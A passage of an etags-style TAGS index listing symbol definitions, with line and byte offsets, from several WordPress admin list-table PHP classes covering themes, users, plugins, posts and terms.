			$filter = $theme->is_allowed( $allowed_where, $this->site_id ) ? 'enabled' : 'disabled';filter87,2468
			$status = 'search';status92,2635
		$totals = array();totals96,2789
		foreach ( $themes as $type => $list )type97,2810
			$status = 'all';status101,2976
		$this->items = $themes[ $status ];items103,2997
		$this->has_items = ! empty( $themes['all'] );has_items106,3077
		$total_this_page = $totals[ $status ];total_this_page107,3125
			$orderby = ucfirst( $orderby );orderby110,3187
			$order = strtoupper( $order );order111,3222
			if ( $orderby == 'Name' ) {orderby113,3257
					$this->items = array_reverse( $this->items );items115,3315
		$start = ( $page - 1 ) * $themes_per_page;start121,3452
			$this->items = array_slice( $this->items, $start, $themes_per_page, true );items124,3543
	function _search_callback( $theme ) {_search_callback132,3744
		static $term;term133,3783
			$term = stripslashes( $_REQUEST['s'] );term135,3825
	function _order_callback( $theme_a, $theme_b ) {_order_callback153,4303
		$a = $theme_a[ $orderby ];a156,4381
		$b = $theme_b[ $orderby ];b157,4410
		if ( $a == $b )a159,4440
	function no_items() {no_items168,4573
	function get_columns() {get_columns175,4737
	function get_sortable_columns() {get_sortable_columns185,4932
	function get_views() {get_views191,5021
		$status_links = array();status_links194,5073
		foreach ( $totals as $type => $count ) {type195,5100
					$text = _nx( 'All <span class="count">(%s)</span>', 'All <span class="count">(%s)</span>', $count, 'themes' );text201,5214
					$text = _n( 'Enabled <span class="count">(%s)</span>', 'Enabled <span class="count">(%s)</span>', $count );text204,5362
					$text = _n( 'Disabled <span class="count">(%s)</span>', 'Disabled <span class="count">(%s)</span>', $count );text207,5508
					$text = _n( 'Update Available <span class="count">(%s)</span>', 'Update Available <span class="count">(%s)</span>', $count );text210,5655
					$text = _n( 'Broken <span class="count">(%s)</span>', 'Broken <span class="count">(%s)</span>', $count );text213,5818
				$url = 'site-themes.php?id=' . $this->site_id;url218,5979
				$url = 'themes.php';url220,6038
					( $type == $status ) ? ' class="current"' : '',type225,6216
	function get_bulk_actions() {get_bulk_actions234,6366
		$actions = array();actions237,6416
	function bulk_actions( $which ) {bulk_actions251,6952
	function current_action() {current_action256,7043
	function display_rows() {display_rows260,7111
		foreach ( $this->items as $key => $theme )key261,7138
	function single_row( $key, $theme ) {single_row265,7225
		$context = $status;context268,7303
			$url = "site-themes.php?id={$this->site_id}&amp;";url271,7359
			$allowed = $theme->is_allowed( 'site', $this->site_id );allowed272,7413
			$url = 'themes.php?';url274,7484
			$allowed = $theme->is_allowed( 'network' );allowed275,7509
		$actions = array(actions279,7575
		$theme_key = $theme->get_stylesheet();theme_key286,7675
		$actions = apply_filters( 'theme_action_links', array_filter( $actions ), $theme_key, $theme, $context );actions301,9176
		$actions = apply_filters( "theme_action_links_$theme_key", $actions, $theme_key, $theme, $context );actions302,9284
		$class = ! $allowed ? 'inactive' : 'active';class304,9388
		$checkbox_id = "checkbox_" . md5( $theme->get('Name') );checkbox_id305,9435
		$checkbox = "<input type='checkbox' name='checked[]' value='" . esc_attr( $theme_key ) . "' id='" . $checkbox_id . "' /><label class='screen-reader-text' for='" . $checkbox_id . "' >" . __('Select') . " " . $theme->display('Name') . "</label>";checkbox306,9494
		$id = sanitize_html_class( $theme->get_stylesheet() );id308,9742
		foreach ( $columns as $column_name => $column_display_name ) {column_name317,9990
			$style = '';style318,10055
				$style = ' style="display:none;"';style320,10115
						$pre = $status == 'broken' ? '' : __( 'Broken Theme:' ) . ' ';pre334,10575
					$theme_meta = array();theme_meta340,10918
					$theme_meta = apply_filters( 'theme_row_meta', $theme_meta, $theme_key, $theme, $status );theme_meta350,11337

wordpress/wp-admin/includes/class-wp-ms-users-list-table.php,3942
class WP_MS_Users_List_Table extends WP_List_Table {WP_MS_Users_List_Table10,137
	function ajax_user_can() {ajax_user_can12,191
	function prepare_items() {prepare_items16,276
		$usersearch = isset( $_REQUEST['s'] ) ? $_REQUEST['s'] : '';usersearch19,348
		$users_per_page = $this->get_items_per_page( 'users_network_per_page' );users_per_page21,412
		$role = isset( $_REQUEST['role'] ) ? $_REQUEST['role'] : '';role23,488
		$paged = $this->get_pagenum();paged25,552
		$args = array(args27,586
		if ( $role == 'super' ) {role38,859
			$logins = implode( "', '", get_super_admins() );logins39,887
		$mode = empty( $_REQUEST['mode'] ) ? 'list' : $_REQUEST['mode'];mode59,1639
		$wp_user_search = new WP_User_Query( $args );wp_user_search62,1745
		$this->items = $wp_user_search->get_results();items64,1794
	function get_bulk_actions() {get_bulk_actions72,1976
		$actions = array();actions73,2007
	function no_items() {no_items82,2238
	function get_views() {get_views86,2292
		$total_users = get_user_count();total_users89,2344
		$super_admins = get_super_admins();super_admins90,2379
		$total_admins = count( $super_admins );total_admins91,2417
		$current_role = false;current_role93,2460
		$class = $role != 'super' ? ' class="current"' : '';class94,2485
		$role_links = array();role_links95,2540
		$class = $role == 'super' ? ' class="current"' : '';class97,2812
	function pagination( $which ) {pagination103,3163
	function get_columns() {get_columns112,3310
		$users_columns = array(users_columns113,3336
		$users_columns = apply_filters( 'wpmu_users_columns', $users_columns );users_columns121,3600
	function get_sortable_columns() {get_sortable_columns126,3704
	function display_rows() {display_rows135,3872
		$alt = '';alt138,3931
		$super_admins = get_super_admins();super_admins139,3944
			$alt = ( 'alternate' == $alt ) ? '' : 'alternate';alt141,4020
			$status_list = array( 'spam' => 'site-spammed', 'deleted' => 'site-deleted' );status_list143,4075
			foreach ( $status_list as $status => $col ) {status145,4158
			foreach ( $columns as $column_name => $column_display_name ) :column_name156,4371
				$class = "class='$column_name column-$column_name'";class157,4437
				$style = '';style159,4495
					$style = ' style="display:none;"';style161,4557
				$attributes = "$class$style";attributes163,4598
						$avatar	= get_avatar( $user->user_email, 32 );avatar174,4913
							$edit_link = esc_url( network_admin_url( 'profile.php' ) );edit_link176,5016
							$edit_link = esc_url( network_admin_url( add_query_arg( 'wp_http_referer', urlencode( stripslashes( $_SERVER['REQUEST_URI'] ) ), 'user-edit.php?user_id=' . $user->ID ) ) );edit_link178,5098
								$actions = array();actions188,5611
									$actions['delete'] = '<a href="' . $delete = esc_url( network_admin_url( add_query_arg( '_wp_http_referer', urlencode( stripslashes( $_SERVER['REQUEST_URI'] ) ), wp_nonce_url( 'users.php', 'deleteuser' ) . '&amp;action=deleteuser&amp;id=' . $user->ID ) ) ) . '" class="delete">' . __( 'Delete' ) . '</a>';delete192,5836
								$actions = apply_filters( 'ms_user_row_actions', $actions, $user );actions195,6162
							$date = 'Y/m/d';date212,6607
							$date = 'Y/m/d \<\b\r \/\> g:i:s a';date214,6642
						$blogs = get_blogs_of_user( $user->ID, true );blogs220,6806
								foreach ( (array) $blogs as $key => $val ) {key223,6925
									$path	= ( $val->path == '/' ) ? '' : $val->path;path227,7050
									$actions = array();actions231,7400
									$class = '';class234,7574
									$actions = apply_filters('ms_user_list_site_actions', $actions, $val->userblog_id);actions246,8161
									$i=0;i248,8255
									$action_count = count( $actions );action_count249,8270
									foreach ( $actions as $action => $link ) {action250,8314
										( $i == $action_count ) ? $sep = '' : $sep = ' | ';i252,8382

wordpress/wp-admin/includes/class-wp-plugin-install-list-table.php,2975
class WP_Plugin_Install_List_Table extends WP_List_Table {WP_Plugin_Install_List_Table10,138
	function ajax_user_can() {ajax_user_can12,198
	function prepare_items() {prepare_items16,276
		$paged = $this->get_pagenum();paged23,449
		$per_page = 30;per_page25,483
		$tabs = array();tabs28,554
		$nonmenu_tabs = array( 'plugin-information' ); //Valid actions to perform which do not have a Menu item.nonmenu_tabs37,894
		$tabs = apply_filters( 'install_plugins_tabs', $tabs );tabs39,1002
		$nonmenu_tabs = apply_filters( 'install_plugins_nonmenu_tabs', $nonmenu_tabs );nonmenu_tabs40,1060
			$tab = key( $tabs );tab44,1320
		$args = array( 'page' => $paged, 'per_page' => $per_page );args46,1345
				$type = isset( $_REQUEST['type'] ) ? stripslashes( $_REQUEST['type'] ) : 'term';type50,1446
				$term = isset( $_REQUEST['s'] ) ? stripslashes( $_REQUEST['s'] ) : '';term51,1531
				$args = false;args75,2049
		$api = plugins_api( 'query_plugins', $args );api81,2101
		$this->items = $api->plugins;items86,2348
	function no_items() {no_items94,2500
	function get_views() {get_views98,2569
		$display_tabs = array();display_tabs101,2616
		foreach ( (array) $tabs as $action => $text ) {action102,2643
			$class = ( $action == $tab ) ? ' class="current"' : '';class103,2693
			$href = self_admin_url('plugin-install.php?tab=' . $action);href104,2752
	function display_tablenav( $which ) {display_tablenav111,2930
	function get_table_classes() {get_table_classes131,3617
	function get_columns() {get_columns137,3719
	function display_rows() {display_rows146,3933
		$plugins_allowedtags = array(plugins_allowedtags147,3960
		$style = array();style156,4379
		foreach ( $columns as $column_name => $column_display_name ) {column_name157,4399
				$plugin = (array) $plugin;plugin163,4642
			$title = wp_kses( $plugin['name'], $plugins_allowedtags );title165,4674
			$description = strip_tags( $plugin['description'] );description167,4792
				$description = mb_substr( $description, 0, 400 ) . '&#8230;';description169,4887
			$description = preg_replace( '/&[^;\s]{0,6}$/', '', $description );description171,4987
			$description = trim( $description );description173,5115
			$description = preg_replace( "|(\r?\n)+|", "\n", $description );description174,5155
			$description = nl2br( $description );description176,5239
			$version = wp_kses( $plugin['version'], $plugins_allowedtags );version177,5280
			$name = strip_tags( $title . ' ' . $version );name179,5348
			$author = $plugin['author'];author181,5399
				$author = ' <cite>' . sprintf( __( 'By %s' ), $author ) . '.</cite>';author183,5470
			$author = wp_kses( $author, $plugins_allowedtags );author185,5545
			$action_links = array();action_links187,5601
				$status = install_plugin_install_status( $plugin );status193,6048
			$action_links = apply_filters( 'plugin_install_action_links', $action_links, $plugin );action_links211,6906

wordpress/wp-admin/includes/class-wp-plugins-list-table.php,6754
class WP_Plugins_List_Table extends WP_List_Table {WP_Plugins_List_Table10,129
	function __construct() {__construct12,182
		$status = 'all';status15,234
			$status = $_REQUEST['plugin_status'];status17,436
		$page = $this->get_pagenum();page22,590
	function get_table_classes() {get_table_classes29,690
	function ajax_user_can() {ajax_user_can33,779
			$menu_perms = get_site_option( 'menu_items', array() );menu_perms35,833
	function prepare_items() {prepare_items44,1031
		$plugins = array(plugins49,1180
		$screen = get_current_screen();screen60,1449
				$current = get_site_transient( 'update_plugins' );current69,1856
				foreach ( (array) $plugins['all'] as $plugin_file => $plugin_data ) {plugin_file70,1911
			$recently_activated = get_option( 'recently_activated', array() );recently_activated82,2306
			$one_week = 7*24*60*60;one_week84,2377
			foreach ( $recently_activated as $key => $time )key85,2404
		foreach ( (array) $plugins['all'] as $plugin_file => $plugin_data ) {plugin_file91,2603
			$status = 'search';status108,3480
		$totals = array();totals112,3602
		foreach ( $plugins as $type => $list )type113,3623
			$status = 'all';status117,3791
		$this->items = array();items119,3812
		foreach ( $plugins[ $status ] as $plugin_file => $plugin_data ) {plugin_file120,3838
		$total_this_page = $totals[ $status ];total_this_page125,4072
			$orderby = ucfirst( $orderby );orderby128,4134
			$order = strtoupper( $order );order129,4169
		$plugins_per_page = $this->get_items_per_page( str_replace( '-', '_', $screen->id . '_per_page' ), 999 );plugins_per_page134,4272
		$start = ( $page - 1 ) * $plugins_per_page;start136,4381
			$this->items = array_slice( $this->items, $start, $plugins_per_page );items139,4474
	function _search_callback( $plugin ) {_search_callback147,4671
		static $term;term148,4711
			$term = stripslashes( $_REQUEST['s'] );term150,4753
	function _order_callback( $plugin_a, $plugin_b ) {_order_callback159,4912
		$a = $plugin_a[$orderby];a162,4992
		$b = $plugin_b[$orderby];b163,5020
		if ( $a == $b )a165,5049
	function no_items() {no_items174,5182
	function get_columns() {get_columns183,5375
	function get_sortable_columns() {get_sortable_columns193,5630
	function get_views() {get_views197,5687
		$status_links = array();status_links200,5739
		foreach ( $totals as $type => $count ) {type201,5766
					$text = _nx( 'All <span class="count">(%s)</span>', 'All <span class="count">(%s)</span>', $count, 'plugins' );text207,5880
					$text = _n( 'Active <span class="count">(%s)</span>', 'Active <span class="count">(%s)</span>', $count );text210,6028
					$text = _n( 'Recently Active <span class="count">(%s)</span>', 'Recently Active <span class="count">(%s)</span>', $count );text213,6182
					$text = _n( 'Inactive <span class="count">(%s)</span>', 'Inactive <span class="count">(%s)</span>', $count );text216,6344
					$text = _n( 'Must-Use <span class="count">(%s)</span>', 'Must-Use <span class="count">(%s)</span>', $count );text219,6491
					$text = _n( 'Drop-ins <span class="count">(%s)</span>', 'Drop-ins <span class="count">(%s)</span>', $count );text222,6638
					$text = _n( 'Update Available <span class="count">(%s)</span>', 'Update Available <span class="count">(%s)</span>', $count );text225,6785
					( $type == $status ) ? ' class="current"' : '',type232,7085
	function get_bulk_actions() {get_bulk_actions241,7236
		$actions = array();actions244,7286
		$screen = get_current_screen();screen246,7309
	function bulk_actions( $which ) {bulk_actions264,7938
	function extra_tablenav( $which ) {extra_tablenav273,8102
		$screen = get_current_screen();screen281,8294
	function current_action() {current_action293,8965
	function display_rows() {display_rows300,9109
		$screen = get_current_screen();screen303,9155
		foreach ( $this->items as $plugin_file => $plugin_data )plugin_file308,9304
	function single_row( $plugin_file, $plugin_data ) {single_row312,9419
		$context = $status;context315,9511
		$screen = get_current_screen();screen317,9534
		$actions = array(actions320,9583
			$is_active = true;is_active328,9722
			$dropins = _get_dropins();dropins330,9783
			$plugin_name = $plugin_file;plugin_name331,9813
				$is_active = true;is_active335,10027
				$description = '<p><strong>' . $dropins[ $plugin_file ][0] . '</strong></p>';description336,10050
				$is_active = true;is_active338,10210
				$description = '<p><strong>' . $dropins[ $plugin_file ][0] . '</strong></p>';description339,10233
				$is_active = false;is_active341,10327
				$description = '<p><strong>' . $dropins[ $plugin_file ][0] . ' <span class="attention">' . __('Inactive:') . '</span></strong> ' . sprintf( __( 'Requires <code>%s</code> in <code>wp-config.php</code>.' ), "define('" . $dropins[ $plugin_file ][1] . "', true);" ) . '</p>';description342,10351
				$is_active = is_plugin_active_for_network( $plugin_file );is_active348,10777
				$is_active = is_plugin_active( $plugin_file );is_active350,10848
		$prefix = $screen->is_network ? 'network_admin_' : '';prefix377,13654
		$actions = apply_filters( $prefix . 'plugin_action_links', array_filter( $actions ), $plugin_file, $plugin_data, $context );actions378,13711
		$actions = apply_filters( $prefix . "plugin_action_links_$plugin_file", $actions, $plugin_file, $plugin_data, $context );actions379,13838
		$class = $is_active ? 'active' : 'inactive';class381,13963
		$checkbox_id =  "checkbox_" . md5($plugin_data['Name']);checkbox_id382,14010
		$checkbox = in_array( $status, array( 'mustuse', 'dropins' ) ) ? '' : "<input type='checkbox' name='checked[]' value='" . esc_attr( $plugin_file ) . "' id='" . $checkbox_id . "' /><label class='screen-reader-text' for='" . $checkbox_id . "' >" . __('Select') . " " . $plugin_data['Name'] . "</label>";checkbox383,14069
			$description = '<p>' . ( $plugin_data['Description'] ? $plugin_data['Description'] : '&nbsp;' ) . '</p>';description385,14406
			$plugin_name = $plugin_data['Name'];plugin_name386,14515
		$id = sanitize_title( $plugin_name );id389,14560
		foreach ( $columns as $column_name => $column_display_name ) {column_name397,14798
			$style = '';style398,14863
				$style = ' style="display:none;"';style400,14923
					$plugin_meta = array();plugin_meta416,15452
						$author = $plugin_data['Author'];author420,15653
							$author = '<a href="' . $plugin_data['AuthorURI'] . '" title="' . esc_attr__( 'Visit author homepage' ) . '">' . $plugin_data['Author'] . '</a>';author422,15742
					$plugin_meta = apply_filters( 'plugin_row_meta', $plugin_meta, $plugin_file, $plugin_data, $status );plugin_meta428,16168

wordpress/wp-admin/includes/class-wp-posts-list-table.php,11221
class WP_Posts_List_Table extends WP_List_Table {WP_Posts_List_Table10,127
	var $hierarchical_display;hierarchical_display19,314
	var $comment_pending_count;comment_pending_count28,464
	var $user_posts_count;user_posts_count37,602
	var $sticky_posts_count = 0;sticky_posts_count46,739
	var $sticky_posts_count = 0;sticky_posts_count46,739
	function __construct() {__construct48,770
		$post_type = get_current_screen()->post_type;post_type51,832
		$post_type_object = get_post_type_object( $post_type );post_type_object52,880
			$this->user_posts_count = $wpdb->get_var( $wpdb->prepare( "user_posts_count55,1013
		if ( 'post' == $post_type && $sticky_posts = get_option( 'sticky_posts' ) ) {sticky_posts65,1486
			$sticky_posts = implode( ', ', array_map( 'absint', (array) $sticky_posts ) );sticky_posts66,1566
			$this->sticky_posts_count = $wpdb->get_var( $wpdb->prepare( "SELECT COUNT( 1 ) FROM $wpdb->posts WHERE post_type = %s AND post_status != 'trash' AND ID IN ($sticky_posts)", $post_type ) );sticky_posts_count67,1648
	function ajax_user_can() {ajax_user_can75,1910
	function prepare_items() {prepare_items81,2036
		$avail_post_stati = wp_edit_posts_query();avail_post_stati84,2141
		$this->hierarchical_display = ( $post_type_object->hierarchical && 'menu_order title' == $wp_query->query['orderby'] );hierarchical_display86,2187
		$total_items = $this->hierarchical_display ? $wp_query->post_count : $wp_query->found_posts;total_items88,2310
		$post_type = $post_type_object->name;post_type90,2406
		$per_page = $this->get_items_per_page( 'edit_' . $post_type . '_per_page' );per_page91,2446
 		$per_page = apply_filters( 'edit_posts_per_page', $per_page, $post_type );per_page92,2525
			$total_pages = ceil( $total_items / $per_page );total_pages95,2641
			$total_pages = $wp_query->max_num_pages;total_pages97,2700
		$mode = empty( $_REQUEST['mode'] ) ? 'list' : $_REQUEST['mode'];mode99,2745
		$this->is_trash = isset( $_REQUEST['post_status'] ) && $_REQUEST['post_status'] == 'trash';is_trash101,2813
	function has_items() {has_items110,3051
	function no_items() {no_items114,3102
	function get_views() {get_views123,3348
		$post_type = $post_type_object->name;post_type126,3441
		$status_links = array();status_links131,3539
		$num_posts = wp_count_posts( $post_type, 'readable' );num_posts132,3566
		$class = '';class133,3623
		$allposts = '';allposts134,3638
		$current_user_id = get_current_user_id();current_user_id136,3657
				$class = ' class="current"';class140,3815
			$allposts = '&all_posts=1';allposts142,4138
		$total_posts = array_sum( (array) $num_posts );total_posts145,4174
		$class = empty( $class ) && empty( $_REQUEST['post_status'] ) && empty( $_REQUEST['show_sticky'] ) ? ' class="current"' : '';class151,4418
			$class = '';class155,4895
			$status_name = $status->name;status_name157,4912
			if ( isset($_REQUEST['post_status']) && $status_name == $_REQUEST['post_status'] )status_name165,5075
				$class = ' class="current"';class166,5161
			$class = ! empty( $_REQUEST['show_sticky'] ) ? ' class="current"' : '';class172,5504
			$sticky_link = array( 'sticky' => "<a href='edit.php?post_type=$post_type&amp;show_sticky=1'$class>" . sprintf( _nx( 'Sticky <span class="count">(%s)</span>', 'Sticky <span class="count">(%s)</span>', $this->sticky_posts_count, 'posts' ), number_format_i18n( $this->sticky_posts_count ) ) . '</a>' );sticky_link174,5580
			$split = 1 + array_search( ( isset( $status_links['publish'] ) ? 'publish' : 'all' ), array_keys( $status_links ) );split177,5948
			$status_links = array_merge( array_slice( $status_links, 0, $split ), $sticky_link, array_slice( $status_links, $split ) );status_links178,6068
	function get_bulk_actions() {get_bulk_actions184,6228
		$actions = array();actions185,6259
	function extra_tablenav( $which ) {extra_tablenav200,6568
				$dropdown_options = array(dropdown_options210,6856
	function current_action() {current_action232,7480
	function pagination( $which ) {pagination239,7652
	function get_table_classes() {get_table_classes248,7853
	function get_columns() {get_columns254,8009
		$screen = get_current_screen();screen255,8035
			$post_type = 'post';post_type258,8096
			$post_type = $screen->post_type;post_type260,8127
		$posts_columns = array();posts_columns262,8164
		$post_status = !empty( $_REQUEST['post_status'] ) ? $_REQUEST['post_status'] : 'all';post_status278,8710
			$posts_columns = apply_filters( 'manage_pages_columns', $posts_columns );posts_columns285,9172
			$posts_columns = apply_filters( 'manage_posts_columns', $posts_columns, $post_type );posts_columns287,9256
		$posts_columns = apply_filters( "manage_{$post_type}_posts_columns", $posts_columns );posts_columns288,9345
	function get_sortable_columns() {get_sortable_columns293,9464
	function display_rows( $posts = array() ) {display_rows303,9677
	function display_rows( $posts = array() ) {posts303,9677
			$posts = $wp_query->posts;posts307,9798
	function _display_rows( $posts ) {_display_rows318,10045
		$post_ids = array();post_ids322,10136
		$this->comment_pending_count = get_pending_comments_num( $post_ids );comment_pending_count327,10223
	function _display_rows_hierarchical( $pages, $pagenum = 1, $per_page = 20 ) {_display_rows_hierarchical333,10361
	function _display_rows_hierarchical( $pages, $pagenum = 1, $per_page = 20 ) {pagenum333,10361
		$level = 0;level336,10457
			$pages = get_pages( array( 'sort_column' => 'menu_order' ) );pages339,10492
			$top_level_pages = array();top_level_pages354,11001
			$children_pages = array();children_pages355,11032
			$pages = &$top_level_pages;pages372,11474
		$count = 0;count375,11510
		$start = ( $pagenum - 1 ) * $per_page;start376,11524
		$end = $start + $per_page;end377,11565
	 * @since 3.1.0 (Standalone function exists since 2.6.0)exists410,12381
	function _page_rows( &$children_pages, &$count, $parent, $level, $pagenum, $per_page ) {_page_rows419,12649
		$start = ( $pagenum - 1 ) * $per_page;start424,12797
		$end = $start + $per_page;end425,12838
			if ( $count == $start && $page->post_parent > 0 ) {count433,13014
				$my_parents = array();my_parents434,13069
				$my_parent = $page->post_parent;my_parent435,13096
					$my_parent = get_post( $my_parent );my_parent437,13160
					$my_parent = $my_parent->post_parent;my_parent441,13285
				$num_parents = count( $my_parents );num_parents443,13334
				while ( $my_parent = array_pop( $my_parents ) ) {my_parent444,13375
	function single_row( $a_post, $level = 0 ) {single_row461,13813
	function single_row( $a_post, $level = 0 ) {level461,13813
		static $alternate;alternate463,13882
		$global_post = $post;global_post465,13904
		$post = $a_post;post466,13928
		$edit_link = get_edit_post_link( $post->ID );edit_link469,13975
		$title = _draft_or_post_title();title470,14023
		$post_type_object = get_post_type_object( $post->post_type );post_type_object471,14058
		$can_edit_post = current_user_can( $post_type_object->cap->edit_post, $post->ID );can_edit_post472,14122
		$alternate = 'alternate' == $alternate ? '' : 'alternate';alternate474,14208
		$classes = $alternate . ' iedit author-' . ( get_current_user_id() == $post->post_author ? 'self' : 'other' );classes475,14269
		foreach ( $columns as $column_name => $column_display_name ) {column_name482,14583
			$class = "class=\"$column_name column-$column_name\"";class483,14648
			$style = '';style485,14707
				$style = ' style="display:none;"';style487,14767
			$attributes = "$class$style";attributes489,14807
					$attributes = 'class="post-title page-title column-title"' . $style;attributes501,15123
						$find_main_page = (int) $post->post_parent;find_main_page505,15344
							$parent = get_page( $find_main_page );parent507,15432
							$find_main_page = (int) $parent->post_parent;find_main_page513,15545
								$parent_name = apply_filters( 'the_title', $parent->post_title, $parent->ID );parent_name516,15636
					$pad = str_repeat( '&#8212; ', $level );pad520,15739
					$attributes = 'class="post-title page-title column-title"' . $style;attributes526,16288
				$actions = array();actions534,16810
				$actions = apply_filters( is_post_type_hierarchical( $post->post_type ) ? 'page_row_actions' : 'post_row_actions', $actions, $post );actions556,18812
					$t_time = $h_time = __( 'Unpublished' );t_time565,19148
					$time_diff = 0;time_diff566,19194
					$t_time = get_the_time( __( 'Y/m/d g:i:s A' ) );t_time568,19228
					$m_time = $post->post_date;m_time569,19282
					$time = get_post_time( 'G', true, $post );time570,19315
					$time_diff = time() - $time;time_diff572,19364
						$h_time = sprintf( __( '%s ago' ), human_time_diff( $time ) );h_time575,19451
						$h_time = mysql2date( __( 'Y/m/d' ), $m_time );h_time577,19530
				$categories = get_the_category();categories602,20316
					$out = array();out604,20389
				$tags = get_the_tags( $post->ID );tags623,20980
					$out = array();out625,21048
				$pending_comments = isset( $this->comment_pending_count[$post->ID] ) ? $this->comment_pending_count[$post->ID] : 0;pending_comments645,21656
		$post = $global_post;post680,22579
	function inline_edit() {inline_edit688,22695
		$screen = get_current_screen();screen691,22738
		$post = get_default_post_to_edit( $screen->post_type );post693,22773
		$post_type_object = get_post_type_object( $screen->post_type );post_type_object694,22831
		$taxonomy_names = get_object_taxonomies( $screen->post_type );taxonomy_names696,22898
		$hierarchical_taxonomies = array();hierarchical_taxonomies697,22963
		$flat_taxonomies = array();flat_taxonomies698,23001
			$taxonomy = get_taxonomy( $taxonomy_name );taxonomy700,23081
		$m = ( isset( $mode ) && 'excerpt' == $mode ) ? 'excerpt' : 'list';m711,23301
		$can_publish = current_user_can( $post_type_object->cap->publish_posts );can_publish712,23371
		$core_columns = array( 'cb' => true, 'date' => true, 'title' => true, 'categories' => true, 'tags' => true, 'comments' => true, 'author' => true );core_columns713,23447
		$hclass = count( $hierarchical_taxonomies ) ? 'post' : 'page';hclass719,23694
		$bulk = 0;bulk720,23759
			$authors_dropdown = '';authors_dropdown761,25253
				$users_opt = array(users_opt764,25375
				if ( $authors = wp_dropdown_users( $users_opt ) ) :authors775,25655
					$authors_dropdown  = '<label class="inline-edit-author">';authors_dropdown776,25711
		$dropdown_args = array(dropdown_args846,28139
		$dropdown_args = apply_filters( 'quick_edit_dropdown_pages_args', $dropdown_args );dropdown_args857,28543
		$post_formats = get_theme_support( 'post-formats' );post_formats997,33626
			$all_post_formats = get_post_format_strings();all_post_formats999,33750
				<?php foreach ( $all_post_formats as $slug => $format ) :slug1009,34233
					$unsupported = ! in_array( $slug, $post_formats[0] );unsupported1010,34295
		foreach ( $columns as $column_name => $column_display_name ) {column_name1026,34752
				$update_text = __( 'Update' );update_text1036,35274

wordpress/wp-admin/includes/class-wp-terms-list-table.php,5354
class WP_Terms_List_Table extends WP_List_Table {WP_Terms_List_Table10,127
	var $callback_args;callback_args12,178
	function __construct() {__construct14,200
			$taxonomy = 'post_tag';taxonomy20,357
		$tax = get_taxonomy( $taxonomy );tax25,464
			$post_type = 'post';post_type28,603
	function ajax_user_can() {ajax_user_can36,716
	function prepare_items() {prepare_items42,818
		$tags_per_page = $this->get_items_per_page( 'edit_' . $taxonomy . '_per_page' );tags_per_page45,867
			$tags_per_page = apply_filters( 'edit_tags_per_page', $tags_per_page );tags_per_page48,986
			$tags_per_page = apply_filters( 'tagsperpage', $tags_per_page ); // Old filtertags_per_page49,1061
			$tags_per_page = apply_filters( 'edit_categories_per_page', $tags_per_page ); // Old filtertags_per_page51,1184
		$search = !empty( $_REQUEST['s'] ) ? trim( stripslashes( $_REQUEST['s'] ) ) : '';search54,1284
		$args = array(args56,1369
		$this->callback_args = $args;callback_args68,1694
	function has_items() {has_items76,1878
	function get_bulk_actions() {get_bulk_actions81,1973
		$actions = array();actions82,2004
	function current_action() {current_action88,2089
	function get_columns() {get_columns95,2333
		$columns = array(columns98,2392
			$post_type_object = get_post_type_object( $post_type );post_type_object108,2678
	function get_sortable_columns() {get_sortable_columns115,2857
	function display_rows_or_placeholder() {display_rows_or_placeholder125,3065
		$args = wp_parse_args( $this->callback_args, array(args128,3128
		$args['offset'] = $offset = ( $page - 1 ) * $number;offset137,3297
		$out = '';out140,3383
		$count = 0;count141,3396
		$terms = array();terms143,3411
			$terms = get_terms( $taxonomy, $args );terms149,3591
				$children = array();children151,3694
				$children = _get_term_hierarchy( $taxonomy );children153,3727
			$terms = get_terms( $taxonomy, $args );terms158,4028
			$count = $number; // Only displaying a single page.count161,4156
	function _rows( $taxonomy, $terms, &$children, $start = 0, $per_page = 20, &$count, $parent = 0, $level = 0 ) {_rows174,4480
	function _rows( $taxonomy, $terms, &$children, $start = 0, $per_page = 20, &$count, $parent = 0, $level = 0 ) {start174,4480
		$end = $start + $per_page;end176,4594
		$output = '';output178,4624
		foreach ( $terms as $key => $term ) {key179,4640
			if ( $count == $start && $term->parent > 0 && empty( $_REQUEST['s'] ) ) {count188,4853
				$my_parents = $parent_ids = array();my_parents189,4930
				$p = $term->parent;p190,4971
					$my_parent = get_term( $p, $taxonomy );my_parent192,5014
					$p = $my_parent->parent;p194,5092
				$num_parents = count( $my_parents );num_parents201,5258
				while ( $my_parent = array_pop( $my_parents ) ) {my_parent202,5299
	function single_row( $tag, $level = 0 ) {single_row222,5830
	function single_row( $tag, $level = 0 ) {level222,5830
		static $row_class = '';row_class223,5873
		static $row_class = '';row_class223,5873
		$row_class = ( $row_class == '' ? ' class="alternate"' : '' );row_class224,5899
		$this->level = $level;level226,5965
	function column_cb( $tag ) {column_cb233,6117
		$default_term = get_option( 'default_' . $taxonomy );default_term236,6174
	function column_name( $tag ) {column_name244,6439
		$default_term = get_option( 'default_' . $taxonomy );default_term247,6510
		$pad = str_repeat( '&#8212; ', max( 0, $this->level ) );pad249,6567
		$name = apply_filters( 'term_name', $pad . ' ' . $tag->name, $tag );name250,6626
		$qe_data = get_term( $tag->term_id, $taxonomy, OBJECT, 'edit' );qe_data251,6697
		$edit_link = esc_url( get_edit_term_link( $tag->term_id, $taxonomy, $post_type ) );edit_link252,6764
		$out = '<strong><a class="row-title" href="' . $edit_link . '" title="' . esc_attr( sprintf( __( 'Edit &#8220;%s&#8221;' ), $name ) ) . '">' . $name . '</a></strong><br />';out254,6851
		$actions = array();actions256,7028
		$actions = apply_filters( 'tag_row_actions', $actions, $tag );actions265,7687
		$actions = apply_filters( "{$taxonomy}_row_actions", $actions, $tag );actions266,7752
	function column_description( $tag ) {column_description277,8184
	function column_slug( $tag ) {column_slug281,8255
	function column_posts( $tag ) {column_posts285,8346
		$count = number_format_i18n( $tag->count );count288,8412
		$tax = get_taxonomy( $taxonomy );tax290,8459
		$ptype_object = get_post_type_object( $post_type );ptype_object292,8496
			$args = array( $tax->query_var => $tag->slug );args297,8630
			$args = array( 'taxonomy' => $tax->name, 'term' => $tag->slug );args299,8692
	function column_links( $tag ) {column_links308,8924
		$count = number_format_i18n( $tag->count );count309,8957
			$count = "<a href='link-manager.php?cat_id=$tag->term_id'>$count</a>";count311,9019
	function column_default( $tag, $column_name ) {column_default315,9114
		$screen = get_current_screen();screen316,9163
	function inline_edit() {inline_edit326,9393
		$core_columns = array( 'cb' => true, 'description' => true, 'name' => true, 'slug' => true, 'posts' => true );core_columns352,10290
		foreach ( $columns as $column_name => $column_display_name ) {column_name356,10452
			<?php $update_text = $tax->labels->update_item; ?>update_text367,10859

wordpress/wp-admin/includes/class-wp-theme-install-list-table.php,3674
class WP_Theme_Install_List_Table extends WP_Themes_List_Table {WP_Theme_Install_List_Table10,137
